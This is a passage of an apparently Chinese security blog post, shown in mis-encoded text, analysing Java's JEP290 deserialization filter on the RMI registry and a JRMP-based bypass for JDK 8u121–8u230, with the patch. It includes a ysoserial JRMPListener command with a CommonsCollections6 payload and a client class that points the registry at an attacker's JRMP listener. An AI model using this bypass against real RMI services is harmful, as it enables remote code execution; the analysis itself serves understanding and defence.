<li>é€šè¿‡setObjectInputFilteræ¥è®¾ç½®filter</li>
<li>ç›´æ¥é€šè¿‡conf/security/java.propertiesæ–‡ä»¶è¿›è¡Œé…ç½®</li>
</ol>
</blockquote>
<h3 id="jep290åº”ç”¨"><strong>JEP290åº”ç”¨</strong><a hidden class="anchor" aria-hidden="true" href="#jep290åº”ç”¨">#</a></h3>
<blockquote>
<p>åœ¨<code>RMIååºåˆ—åŒ–</code>ä¸­åº”ç”¨åœ¨<code>registerç«¯</code>ï¼Œæ¯”å¦‚<code>bindç»‘å®šå¯¹è±¡</code>æ—¶ï¼Œ<code>JEP290æ˜¯éœ€è¦è®¾ç½®çš„</code>ï¼ŒåƒClientå’ŒServerä¹‹é—´çš„äº’æ‰“åˆ™æ²¡æœ‰JEP290çš„æ£€æµ‹ï¼Œæ‰€ä»¥ä¹‹åçš„ç‰ˆæœ¬è¿˜æ˜¯èƒ½ç›¸äº’æ‰“ã€‚</p>
</blockquote>
<p>åœ¨8u121åï¼Œjavaåœ¨<code>oldDispatch#unmarshalCustomCallData()</code>ä¸­é€šè¿‡<code>setObjectInputFilter</code>è¿›è¡Œè®¾ç½®</p>
<p><img loading="lazy" src="images/image-20250116164428155.png" alt="image-20250116164428155"  />
</p>
<p><img loading="lazy" src="images/image-20250116164635356.png" alt="image-20250116164635356"  />
</p>
<p>è¿™é‡Œ<code>UnicastServerRef.this.filter</code>å­˜å‚¨çš„æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼<code>RegistryImpl::registryFilter</code>ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆåé¢ä¼šè°ƒåˆ°è¿™ä¸ª<code>registryFilter</code>æ–¹æ³•è¿›è¡Œæ£€æµ‹</p>
<p><img loading="lazy" src="images/image-20250116170131417.png" alt="image-20250116170131417"  />
</p>
<h3 id="jep290ä½œç”¨ç‚¹">JEP290ä½œç”¨ç‚¹<a hidden class="anchor" aria-hidden="true" href="#jep290ä½œç”¨ç‚¹">#</a></h3>
<p>æ²¡æœ‰JEP290æ—¶ï¼Œæˆ‘ä»¬é€šè¿‡ä¸‹å›¾<code>readObject</code>å°±å¯ä»¥æˆåŠŸå®ç°<code>ååºåˆ—åŒ–æ”»å‡»</code></p>
<p><img loading="lazy" src="images/image-20250116163537694.png" alt="image-20250116163537694"  />
</p>
<p>JEP290ä½œç”¨ç‚¹ä¹Ÿåœ¨è¿™ä¸ª<code>readObject</code>ä¸­ï¼Œè¿™é‡Œ<code>serialFilter</code>å°±æ˜¯å‰é¢çš„<code>filter(RegistryImpl::registryFilter)</code>ï¼Œè¿›å…¥<code>registryFilter</code>ï¼Œ<code>registryFilter</code>å°±æ˜¯JEP290è®¾ç½®çš„è¿‡æ»¤Filterï¼Œè¿™é‡Œä¼šå…ˆå°†éœ€è¦<code>ååºåˆ—åŒ–çš„ç±»</code>è¿›è¡Œ<code>ç™½åå•æ£€æµ‹(å°±æ˜¯è¿™ä¸ªreturnåˆ¤æ–­)</code>ï¼Œç„¶åå†è¿›è¡Œååºåˆ—åŒ–</p>
<p><img loading="lazy" src="images/image-20250116171006272.png" alt="image-20250116171006272"  />
</p>
<p><img loading="lazy" src="images/image-20250116165212572.png" alt="image-20250116165212572"  />
</p>
<p>ç™½åå•å¦‚ä¸‹ï¼š</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">String.class
</span></span><span class="line"><span class="cl">Number.class
</span></span><span class="line"><span class="cl">Remote.class
</span></span><span class="line"><span class="cl">Proxy.class
</span></span><span class="line"><span class="cl">UnicastRef.class
</span></span><span class="line"><span class="cl">RMIClientSocketFactory.class
</span></span><span class="line"><span class="cl">RMIServerSocketFactory.class
</span></span><span class="line"><span class="cl">ActivationID.class
</span></span><span class="line"><span class="cl">UID.class
</span></span></code></pre></div><p>è¿™é‡Œæˆ‘ä»¬çš„æ¶æ„å¯¹è±¡ä¸åœ¨ç™½åå•ä¸­ï¼Œä»è€Œå¯¼è‡´æˆ‘ä»¬ååºåˆ—åŒ–æ”»å‡»å¤±è´¥</p>
<h2 id="bypass-8u1218u230">Bypass 8u121~8u230<a hidden class="anchor" aria-hidden="true" href="#bypass-8u1218u230">#</a></h2>
<blockquote>
<p>è¿™é‡Œç»•è¿‡æ€è·¯æ˜¯ï¼Œ<code>serialFilter</code>ä½œç”¨äºæˆ‘ä»¬çš„æ¶æ„Serverç«¯å’ŒRegisterç«¯çš„ååºåˆ—åŒ–ï¼Œä½†å…¶å®åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­è¿˜å­˜åœ¨ä¸€æ®µé€šä¿¡ï¼Œè€Œè¿™æ®µé€šä¿¡ä¸­çš„<code>serialFilter</code>å’Œç¬¬ä¸€æ®µé€šä¿¡çš„<code>serialFilter</code>æ˜¯ç›¸äº’ç‹¬ç«‹çš„ï¼ŒåŠç¬¬äºŒæ®µé€šä¿¡ååºåˆ—åŒ–ä¸ä¼šæœ‰è¿™ä¸ª<code>æ£€æµ‹</code>ï¼Œä¸”è¿™æ®µé€šä¿¡çš„æ•°æ®ä¹Ÿæ˜¯<code>åºåˆ—åŒ–ä¼ è¾“</code>çš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥åœ¨ç¬¬ä¸€æ®µæµç¨‹ä¸­<code>æ§åˆ¶</code>ç¬¬äºŒæ®µé€šä¿¡çš„<code>æœåŠ¡åœ°å€</code>ï¼Œè¿æ¥ä¸Šæˆ‘ä»¬çš„æ¶æ„æœåŠ¡ï¼Œè¿”å›<code>æ¶æ„ååºåˆ—åŒ–å†…å®¹</code>å³å¯ååºåˆ—åŒ–æ”»å‡»æˆåŠŸï¼Œå…‰çœ‹è¿™æ®µæè¿°å¯èƒ½ä¸å¤ªèƒ½ç†è§£ï¼Œä¸ç”¨æ‹…å¿ƒï¼Œå¯ä»¥çœ‹çœ‹ä¸‹é¢å…·ä½“åˆ†æ</p>
</blockquote>
<h3 id="å®ç°demo">å®ç°demo<a hidden class="anchor" aria-hidden="true" href="#å®ç°demo">#</a></h3>
<p>è¿™é‡Œæ”»å‡»çš„æ˜¯<code>register</code></p>
<p>ä¾æ¬¡æ‰§è¡Œä¸‹é¢å‘½ä»¤å’Œjavaæ–‡ä»¶</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">MyFiles</span><span class="err">\</span><span class="n">Tools</span><span class="err">\</span><span class="n">ENV</span><span class="err">\</span><span class="n">JAVA</span><span class="err">\</span><span class="n">jdk1</span><span class="p">.</span><span class="na">8</span><span class="p">.</span><span class="na">0_192</span><span class="err">\</span><span class="n">bin</span><span class="err">\</span><span class="n">java</span><span class="p">.</span><span class="na">exe</span><span class="w"> </span><span class="o">-</span><span class="n">cp</span><span class="w"> </span><span class="n">ysoserial</span><span class="p">.</span><span class="na">jar</span><span class="w"> </span><span class="n">ysoserial</span><span class="p">.</span><span class="na">exploit</span><span class="p">.</span><span class="na">JRMPListener</span><span class="w"> </span><span class="n">3333</span><span class="w"> </span><span class="n">CommonsCollections6</span><span class="w"> </span><span class="s">&#34;calc&#34;</span><span class="w">
</span></span></span></code></pre></div><p>RMIRegistry</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">JEP290</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.LocateRegistry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">RMIRegistry</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">LocateRegistry</span><span class="p">.</span><span class="na">createRegistry</span><span class="p">(</span><span class="n">1099</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;RMI Registry Start&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>DefineClient</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">JEP290</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.example.HelloImpl</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">sun.rmi.server.UnicastRef</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">sun.rmi.transport.LiveRef</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">sun.rmi.transport.tcp.TCPEndpoint</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.Remote</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.LocateRegistry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.Registry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.server.ObjID</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.server.RemoteObjectInvocationHandler</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Random</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">DefineClient</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Registry</span><span class="w"> </span><span class="n">registry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LocateRegistry</span><span class="p">.</span><span class="na">getRegistry</span><span class="p">(</span><span class="n">1099</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjID</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjID</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Random</span><span class="p">().</span><span class="na">nextInt</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TCPEndpoint</span><span class="w"> </span><span class="n">te</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TCPEndpoint</span><span class="p">(</span><span class="s">&#34;localhost&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">3333</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">UnicastRef</span><span class="w"> </span><span class="n">ref</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnicastRef</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">LiveRef</span><span class="p">(</span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="n">te</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">RemoteObjectInvocationHandler</span><span class="w"> </span><span class="n">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RemoteObjectInvocationHandler</span><span class="p">(</span><span class="n">ref</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// lookupæ–¹æ³•ä¹Ÿå¯ä»¥ï¼Œä½†éœ€è¦æ‰‹åŠ¨æ¨¡æ‹Ÿlookupæ–¹æ³•çš„æµç¨‹</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">registry</span><span class="p">.</span><span class="na">bind</span><span class="p">(</span><span class="s">&#34;pwn&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">handler</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h3 id="ç®€å•æµç¨‹åˆ†æ">ç®€å•æµç¨‹åˆ†æ<a hidden class="anchor" aria-hidden="true" href="#ç®€å•æµç¨‹åˆ†æ">#</a></h3>
<p>åœ¨åŸå…ˆ<code>readOject</code>ä¸‹é¢è¿™é‡Œ<code>var2.releaseInputStream();</code>ä¼šè¿›è¡Œç¬¬äºŒæ®µé€šä¿¡åˆ©ç”¨</p>
<p><img loading="lazy" src="images/image-20250116183504927.png" alt="image-20250116183504927"  />
</p>
<p>åœ¨<code>registerRefs</code>ä¼šå¾—åˆ°<code>JRMPæ®µæœåŠ¡åœ°å€</code>ï¼Œè¿™ä¸ªå€¼æ€ä¹ˆåˆå§‹åŒ–çš„åé¢ä¼šæåˆ°</p>
<p><img loading="lazy" src="images/image-20250116183653984.png" alt="image-20250116183653984"  />
</p>
<p>è¿™é‡Œlookupå…¶å®æ²¡å¹²ä»€ä¹ˆï¼Œåªæ˜¯å°è£…äº†ä¸‹æˆ‘ä»¬çš„var0</p>
<p><img loading="lazy" src="images/image-20250116184054361.png" alt="image-20250116184054361"  />
</p>
<p><img loading="lazy" src="images/image-20250117090443370.png" alt="image-20250117090443370"  />
</p>
<p>åç»­åœ¨<code>executeCall()</code>ä¸­<code>this.getInputStream();</code>å»ºç«‹<code>æ–°çš„é€šè®¯</code>ï¼Œç„¶åå°†æ¥æ”¶åºåˆ—åŒ–æ•°æ®æ‰§è¡Œ<code>ååºåˆ—åŒ–</code></p>
<p><img loading="lazy" src="images/image-20250117092945164.png" alt="image-20250117092945164"  />
</p>
<p><img loading="lazy" src="images/image-20250116184555886.png" alt="image-20250116184555886"  />
</p>
<p>è°ƒç”¨æ ˆ</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">executeCall</span><span class="p">:</span><span class="n">220</span><span class="p">,</span><span class="w"> </span><span class="n">StreamRemoteCall</span><span class="w"> </span><span class="p">(</span><span class="n">sun</span><span class="p">.</span><span class="na">rmi</span><span class="p">.</span><span class="na">transport</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">invoke</span><span class="p">:</span><span class="n">375</span><span class="p">,</span><span class="w"> </span><span class="n">UnicastRef</span><span class="w"> </span><span class="p">(</span><span class="n">sun</span><span class="p">.</span><span class="na">rmi</span><span class="p">.</span><span class="na">server</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">dirty</span><span class="p">:</span><span class="n">109</span><span class="p">,</span><span class="w"> </span><span class="n">DGCImpl_Stub</span><span class="w"> </span><span class="p">(</span><span class="n">sun</span><span class="p">.</span><span class="na">rmi</span><span class="p">.</span><span class="na">transport</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">makeDirtyCall</span><span class="p">:</span><span class="n">382</span><span class="p">,</span><span class="w"> </span><span class="n">DGCClient$EndpointEntry</span><span class="w"> </span><span class="p">(</span><span class="n">sun</span><span class="p">.</span><span class="na">rmi</span><span class="p">.</span><span class="na">transport</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">registerRefs</span><span class="p">:</span><span class="n">324</span><span class="p">,</span><span class="w"> </span><span class="n">DGCClient$EndpointEntry</span><span class="w"> </span><span class="p">(</span><span class="n">sun</span><span class="p">.</span><span class="na">rmi</span><span class="p">.</span><span class="na">transport</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">registerRefs</span><span class="p">:</span><span class="n">160</span><span class="p">,</span><span class="w"> </span><span class="n">DGCClient</span><span class="w"> </span><span class="p">(</span><span class="n">sun</span><span class="p">.</span><span class="na">rmi</span><span class="p">.</span><span class="na">transport</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">registerRefs</span><span class="p">:</span><span class="n">102</span><span class="p">,</span><span class="w"> </span><span class="n">ConnectionInputStream</span><span class="w"> </span><span class="p">(</span><span class="n">sun</span><span class="p">.</span><span class="na">rmi</span><span class="p">.</span><span class="na">transport</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">releaseInputStream</span><span class="p">:</span><span class="n">157</span><span class="p">,</span><span class="w"> </span><span class="n">StreamRemoteCall</span><span class="w"> </span><span class="p">(</span><span class="n">sun</span><span class="p">.</span><span class="na">rmi</span><span class="p">.</span><span class="na">transport</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">dispatch</span><span class="p">:</span><span class="n">80</span><span class="p">,</span><span class="w"> </span><span class="n">RegistryImpl_Skel</span><span class="w"> </span><span class="p">(</span><span class="n">sun</span><span class="p">.</span><span class="na">rmi</span><span class="p">.</span><span class="na">registry</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">oldDispatch</span><span class="p">:</span><span class="n">468</span><span class="p">,</span><span class="w"> </span><span class="n">UnicastServerRef</span><span class="w"> </span><span class="p">(</span><span class="n">sun</span><span class="p">.</span><span class="na">rmi</span><span class="p">.</span><span class="na">server</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">dispatch</span><span class="p">:</span><span class="n">300</span><span class="p">,</span><span class="w"> </span><span class="n">UnicastServerRef</span><span class="w"> </span><span class="p">(</span><span class="n">sun</span><span class="p">.</span><span class="na">rmi</span><span class="p">.</span><span class="na">server</span><span class="p">)</span><span class="w">
</span></span></span></code></pre></div><h4 id="tcpendpointjrmpæ®µåœ°å€çš„èµ‹å€¼">TCPEndpointï¼ˆJRMPæ®µåœ°å€ï¼‰çš„èµ‹å€¼<a hidden class="anchor" aria-hidden="true" href="#tcpendpointjrmpæ®µåœ°å€çš„èµ‹å€¼">#</a></h4>
<p>ä»–çš„<code>èµ‹å€¼</code>å…¶å®æ˜¯åœ¨åŸå…ˆ<code>ååºåˆ—åŒ–åˆ©ç”¨ç‚¹</code>å¼€å§‹çš„</p>
<p><img loading="lazy" src="images/image-20250117091153045.png" alt="image-20250117091153045"  />
</p>
<p>æˆ‘ä»¬è®¾ç½®çš„å¯¹è±¡æ˜¯ä¸“é—¨ç»§æ‰¿<code>RemoteObject(ç»§æ‰¿Remoteåœ¨ç™½åå•ä¸Š)</code>çš„ï¼Œåˆ°å…¶çš„readObjectï¼Œè·Ÿè¿›<code>ref.readExternal(in);</code></p>
<p><img loading="lazy" src="images/image-20250117091216556.png" alt="image-20250117091216556"  />
</p>
<p>è·Ÿè¿›<code>LiveRef.read</code></p>
<p><img loading="lazy" src="images/image-20250117091252179.png" alt="image-20250117091252179"  />
</p>
<p>è¿™é‡Œä¼šä»<code>åºåˆ—åŒ–æ•°æ®</code>æå–å‡º<code>ip</code>å’Œ<code>port</code>ï¼Œç”Ÿæˆä¸€ä¸ª<code>TCPEndpoint</code>èµ‹ç»™<code>var2</code>ï¼Œç„¶åå°è£…æˆä¸€ä¸ª<code>LiveRef</code>ä¼ åˆ°<code>var6.saveRef()</code>é‡Œ</p>
<p><img loading="lazy" src="images/image-20250117091505833.png" alt="image-20250117091505833"  />
</p>
<p><code>saveRef()</code>é‡Œæœ€åå­˜åœ¨åˆ°<code>incomingRefTable</code>è¿™ä¸ªtableé‡Œé¢ï¼Œå¯ä»¥å›å¤´çœ‹<code>åˆ©ç”¨åˆ†æ</code>ï¼Œå°±æ˜¯ä»<code>è¿™ä¸ªå˜é‡</code>å–çš„<code>å¯¹è±¡</code></p>
<p><img loading="lazy" src="images/image-20250117091528593.png" alt="image-20250117091528593"  />
</p>
<h3 id="2æ®µé€šä¿¡--serialfilter"><strong>2æ®µé€šä¿¡</strong> &amp; serialFilter<a hidden class="anchor" aria-hidden="true" href="#2æ®µé€šä¿¡--serialfilter">#</a></h3>
<p>è¿™é‡Œæœ‰ä¸ªç‚¹éœ€è¦ææ¸…æ¥šå…³äº<code>serialFilter</code></p>
<p><strong>ç¬¬ä¸€æ®µé€šä¿¡</strong></p>
<p>ç¬¬ä¸€æ®µé€šä¿¡ï¼Œç¬¬ä¸€æ®µé€šä¿¡æ˜¯å»ºç«‹äº<code>æˆ‘ä»¬Serverç«¯bind()</code>,å‘<code>Registerç«¯</code>è¿›è¡Œæ•°æ®ä¼ è¾“ï¼Œè®°ä½è¿™é‡Œçš„<code>ConnectionInputStream@982</code>ç¼–å·ï¼Œä»–çš„superçš„superæ—¢æ˜¯<code>ObjectInputStream(å­˜å‚¨serialFilter)</code></p>
<p><img loading="lazy" src="images/image-20250116175215389.png" alt="image-20250116175215389"  />
</p>
<p>ç„¶åæ²¡æœ‰ç‰¹åˆ«è®¾ç½®çš„è¯ï¼Œ<code>serialFilter</code>æ˜¯ä¸º<code>null</code>çš„</p>
<p><img loading="lazy" src="images/image-20250116175611151.png" alt="image-20250116175611151"  />
</p>
<p>ç¬¬ä¸€æ®µé€šä¿¡ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“åœ¨<code>unmarshalCustomCallData()</code>ä¸­ç»™<code>this.serialFilter</code>è®¾ç½®äº†å€¼ï¼Œæ³¨æ„è¿™é‡Œç¼–å·<code>ConnectionInputStream@982</code></p>
<p><img loading="lazy" src="images/image-20250116175749107.png" alt="image-20250116175749107"  />
</p>
<p><strong>ç¬¬äºŒæ®µé€šä¿¡ï¼ŒJRMPåè®®</strong></p>
<p>æ³¨æ„åˆ°<code>UnicastRef#invoke</code>=&gt;<code>executeCall()</code>=&gt;<code>this.getInputStream();</code>ä¼šå»ºç«‹<code>æ–°çš„é€šä¿¡</code>ï¼Œè¿™é‡Œç¼–å·ä¸º<code>ConnectionInputStream@1160</code></p>
<p><img loading="lazy" src="images/image-20250116180232622.png" alt="image-20250116180232622"  />
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">ObjectInput</span><span class="w"> </span><span class="nf">getInputStream</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">in</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Transport</span><span class="p">.</span><span class="na">transportLog</span><span class="p">.</span><span class="na">log</span><span class="p">(</span><span class="n">Log</span><span class="p">.</span><span class="na">VERBOSE</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;getting input stream&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">this</span><span class="p">.</span><span class="na">in</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ConnectionInputStream</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">conn</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">in</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="images/image-20250116180555439.png" alt="image-20250116180555439"  />
</p>
<p>è¿›è¡Œåˆå§‹åŒ–ï¼Œæ‰€ä»¥è¿™é‡Œ<code>serialFilter</code>ä¸º<code>null</code>ï¼Œå¹¶ä¸å­˜åœ¨ç¬¬ä¸€æ®µ<code>é€šä¿¡è®¾ç½®çš„å€¼</code></p>
<p><img loading="lazy" src="images/image-20250116180932774.png" alt="image-20250116180932774"  />
</p>
<p>åŠ<strong>ååºåˆ—åŒ–çš„æ—¶å€™ä¹Ÿä¸ä¼šå­˜åœ¨æ£€æµ‹</strong></p>
<p><img loading="lazy" src="images/image-20250116181200490.png" alt="image-20250116181200490"  />
</p>
<p><img loading="lazy" src="images/image-20250116181059282.png" alt="image-20250116181059282"  />
</p>
<p><strong>å°ç»“:</strong></p>
<blockquote>
<p>è¿™é‡Œæˆ‘æƒ³è¡¨è¾¾ä»€ä¹ˆå‘¢ï¼Œå°±æ˜¯åˆ†æ¸…æ¥šï¼Œè¿™ç§æ–¹æ³•<code>ä¸ºä»€ä¹ˆå¯ä»¥ç»•è¿‡JEP290</code>ï¼Œç¬¬ä¸€æ®µé€šä¿¡æ˜¯å’Œ<code>Serverç«¯</code>ï¼Œç¬¬äºŒæ®µæ˜¯å’Œ<code>JMRPç«¯</code>ã€‚è¿™é‡Œ<code>ConnectionInputStream</code>å…¶å®å°±ä»£è¡¨ç€<code>ObjectInputStream</code>ï¼Œè€Œç¬¬ä¸€æ®µé€šä¿¡ä¸­è®¾ç½®çš„<code>serialFilter</code>åªä½œç”¨äºç¬¬ä¸€æ®µé€šä¿¡ä¸­ï¼ŒåŠåªä½œç”¨äº<code>Registerå’ŒServerä¹‹é—´çš„readObjectä¸­</code>ï¼ï¼ï¼ˆ<code>JEP290ä½œç”¨åŸŸ</code>ï¼‰</p>
</blockquote>
<p>ç›¸ä¿¡å¯¹ä¸Šé¢çš„åˆ†æï¼Œå¯¹JEP290æœ‰æ¯”è¾ƒæ¸…æ™°çš„ç†è§£äº†</p>
<p><strong>ä¿®å¤ï¼š</strong></p>
<p>åœ¨<code>dirty()</code>æ–¹æ³•ä¸­<code>å»ºç«‹é€šè®¯</code>åï¼Œç»™<code>this.filter</code>è®¾ç½®äº†ä¸€ä¸ª<code>JEP290</code>(è¡¨è¾¾å¼)</p>
<p><img loading="lazy" src="images/image-20250117101356593.png" alt="image-20250117101356593"  />
</p>
<p>ç„¶ååœ¨<code>this.in</code>çš„<code>serialFilter</code>ä¸­è®¾ç½®ä¸Šè¿™ä¸ª<code>filter</code></p>
<p><img loading="lazy" src="images/image-20250117102416120.png" alt="image-20250117102416120"  />
</p>
<p>ç„¶åè¢«æ£€æµ‹å‡ºæ¥</p>
<p><img loading="lazy" src="images/image-20250117102758820.png" alt="image-20250117102758820"  />
</p>
